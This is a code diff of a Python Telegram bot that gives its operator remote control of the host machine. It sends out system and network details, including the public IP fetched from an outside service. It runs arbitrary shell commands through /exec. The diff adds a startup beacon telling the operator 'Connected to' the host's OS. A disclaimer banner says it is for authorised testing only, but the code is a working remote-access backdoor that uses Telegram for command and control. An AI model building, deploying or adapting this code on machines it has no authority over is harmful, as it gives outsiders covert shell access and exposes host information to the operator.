@@ -4,9 +4,11 @@ import subprocess
 import psutil
 from datetime import datetime
 import telebot
+import requests
 
+# === CONFIGURATION ===
 BOT_TOKEN = "YOUR_BOT_TOKEN"
-AUTHORIZED_USER_ID = 123456789  # your Telegram user ID
+AUTHORIZED_USER_ID = 123456789  # Replace with your actual Telegram user ID
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -16,7 +18,13 @@ def is_authorized(message):
 def get_system_info():
     uname = platform.uname()
     hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
+    local_ip = socket.gethostbyname(hostname)
+
+    try:
+        public_ip = requests.get("https://api.ipify.org").text
+    except:
+        public_ip = "Unavailable"
+
     return (
         f"📋 System Info:\n"
         f"System   : {uname.system}\n"
@@ -25,7 +33,8 @@ def get_system_info():
         f"Version  : {uname.version}\n"
         f"Machine  : {uname.machine}\n"
         f"Processor: {uname.processor}\n"
-        f"IP       : {ip}\n"
+        f"Local IP : {local_ip}\n"
+        f"Public IP: {public_ip}\n"
         f"Time     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     )
 
@@ -72,19 +81,20 @@ def get_network_info():
                 lines.append(f"    MAC: {addr.address}")
     return "\n".join(lines)
 
+# === TELEGRAM COMMANDS ===
 @bot.message_handler(commands=['start', 'help'])
 def send_help(message):
     if not is_authorized(message): return
     bot.reply_to(message, """
 ✅ Commands:
-/sysinfo   - System info
-/disk      - Disk usage
-/memory    - RAM usage
-/uptime    - System uptime
-/processes - Top CPU processes
-/netinfo   - Network info
+/sysinfo    - System info
+/disk       - Disk usage
+/memory     - RAM usage
+/uptime     - System uptime
+/processes  - Top CPU processes
+/netinfo    - Network info
 /exec <cmd> - Run shell command
-/help      - This help message
+/help       - This help message
 """)
 
 @bot.message_handler(commands=['sysinfo'])
@@ -128,15 +138,32 @@ def exec_command(message):
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15, universal_newlines=True)
         bot.reply_to(message, f"🖥️ Output:\n{output[:4000]}")
     except subprocess.CalledProcessError as e:
-        bot.reply_to(message, f"Command error:\n{e.output}")
+        bot.reply_to(message, f"❌ Command error:\n{e.output}")
     except Exception as e:
-        bot.reply_to(message, f"Execution failed: {e}")
+        bot.reply_to(message, f"❌ Execution failed: {e}")
 
 @bot.message_handler(func=lambda m: True)
 def unknown(message):
     if is_authorized(message):
         bot.reply_to(message, "❓ Unknown command. Use /help.")
 
+# === START SCRIPT ===
 if __name__ == "__main__":
+    os_name = platform.system()
+
+    try:
+        bot.send_message(AUTHORIZED_USER_ID, f"🟢 Connected to {os_name}")
+    except Exception as e:
+        print(f"❌ Failed to notify Telegram: {e}")
+
     print("🤖 Bot running...")
-    bot.polling()
+
+    # Banner
+    print("\n" + "=" * 40)
+    print("🔐 Made by Debasis Biswas")
+    print("📧 forensic@debasisbiswas.me")
+    print("📜 This tool is for ethical and authorized testing only.")
+    print("🔍 Misuse is strictly prohibited.")
+    print("=" * 40 + "\n")
+
+    bot.polling(non_stop=True)
